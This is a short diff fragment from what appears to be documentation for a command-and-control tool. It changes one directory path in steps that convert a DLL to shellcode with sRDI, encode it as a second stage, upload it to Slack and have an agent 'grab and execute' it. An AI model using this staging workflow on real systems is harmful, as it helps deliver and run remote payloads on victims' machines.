@@ -56,7 +56,7 @@ To have it load a second stage:
 sRDI\Python> py ConvertToShellcode.py <path_to_dll>
 # That created <path_to_dll>.bin
 
-sRDI\Python> cd solo.ranger\controller
+sRDI\Python> cd ..\..\controller
 yasc\controller> py gen_stage2.py <path_to_dll>.bin <path_to_dll>_encoded.bin
 # <path_to_dll>_encoded.bin now contains "an encoded shellcode" 
 # Upload to slack and "grab and execute" by an agent
